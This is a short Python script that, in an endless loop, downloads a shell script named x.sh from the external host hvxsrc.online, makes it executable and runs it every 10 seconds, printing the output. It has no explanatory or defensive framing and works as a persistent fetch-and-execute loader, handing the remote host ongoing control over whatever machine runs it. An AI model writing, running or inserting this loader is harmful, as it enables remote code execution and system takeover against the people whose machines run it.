import urllib.request
import os
import subprocess
import time

url = "https://hvxsrc.online/x.sh"
filename = "x.sh"

while True:
    try:
        print(f"[{time.strftime('%H:%M:%S')}] Downloading x.sh...")
        urllib.request.urlretrieve(url, filename)
        print("[OK] File downloaded.")
        
        os.chmod(filename, 0o755)
        print("[OK] Made executable.")
        
        print("[RUN] Executing x.sh...")
        process = subprocess.run(["./" + filename], stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True)
        
        if process.stdout:
            print("--- Output from x.sh ---")
            print(process.stdout)
            
        if process.returncode == 0:
            print("[OK] Execution successful.")
        else:
            print(f"[ERR] Execution failed with code {process.returncode}")
            
    except Exception as e:
        print(f"[ERR] Error: {e}")
        
    print(f"Waiting 10 seconds before next run...\n")
    time.sleep(10)